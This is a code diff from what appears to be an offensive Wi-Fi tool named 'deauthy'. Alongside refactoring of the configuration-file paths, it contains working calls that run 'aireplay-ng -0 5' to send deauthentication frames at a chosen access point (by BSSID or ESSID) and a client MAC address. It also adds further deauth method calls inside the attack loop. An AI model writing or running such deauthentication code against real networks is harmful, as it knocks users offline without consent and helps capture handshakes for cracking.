@@ -102,6 +102,7 @@ class Functs:
                 Functs.ChannelSys.hopper(value)
                 try:
                     out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", get_var('target_mac'), get_var('interface')], stdout=DEVNULL, stderr=STDOUT)
+                    Functs.BSSID_METHOD.deauth(BSSID(bssid.bssids))
                 except KeyboardInterrupt:
                     Functs.switch(Interface(get_var('interface')), "managed")
                     return
@@ -115,23 +116,24 @@ class Functs:
             channel = eSSID.channel
             Functs.ChannelSys.hopper(channel)
             try:
-                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID.value, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                Functs.ESSID_METHOD.deauth(ESSID(eSSID.value, channel))
             except KeyboardInterrupt:
                 Functs.switch(Interface(current_wiface), "managed")
                 return
 
 def mod_config(key: str, value):
-    with open("conf.json", "r") as jsonfile:
+    with open("deauthy/conf.json", "r") as jsonfile:
         data = json.load(jsonfile)
         jsonfile.close()
         
     data[key] = value
-    with open("conf.json", "w") as jsonfile:
-        myJSON = json.dump(data, jsonfile)
+    with open("deauthy/conf.json", "w") as jsonfile:
+        myJSON = json.dump(data, jsonfile, indent=2)
         jsonfile.close()
 
 def get_var(key: str):
-    with open("conf.json", "r") as jsonfile:
+    with open("deauthy/conf.json", "r") as jsonfile:
         data = json.load(jsonfile)
         jsonfile.close()
         try:
